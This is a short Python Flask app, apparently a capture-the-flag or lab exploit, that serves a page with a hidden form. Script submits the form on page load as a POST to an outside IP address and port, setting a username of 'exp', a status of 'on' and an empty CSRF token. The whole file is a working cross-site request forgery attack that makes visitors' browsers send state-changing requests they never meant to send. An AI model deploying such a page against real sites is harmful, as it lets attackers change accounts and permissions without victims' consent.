from flask import Flask, render_template_string

app = Flask(__name__)

@app.route("/")
def index():
    return """
    <form name="csrf" action="http://34.134.162.213:17001/" method="post">
        <input type="hidden" name="username" value="exp" />
        <input type="hidden" name="status" value="on" />
        <input type="hidden" name="csrf_token" value="" />
    </form>
    <script>
        document.csrf.submit();
    </script>
    """
